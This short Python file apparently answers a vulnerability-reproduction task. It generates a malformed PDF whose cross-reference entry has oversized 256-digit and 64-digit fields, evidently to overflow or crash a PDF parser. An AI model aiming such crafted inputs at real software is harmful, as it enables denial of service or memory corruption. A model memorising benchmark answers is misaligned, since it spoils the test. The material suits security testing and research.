import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        header = b"%PDF-1.3\n"
        offset_xref = len(header)

        f1_len = 256
        f2_len = 64

        xref_entry = b"0" * f1_len + b" " + b"0" * f2_len + b" f \n"
        xref = b"xref\n0 1\n" + xref_entry

        trailer = b"trailer\n<< /Size 1 >>\n"
        startxref = b"startxref\n" + str(offset_xref).encode("ascii") + b"\n%%EOF\n"

        return header + xref + trailer + startxref
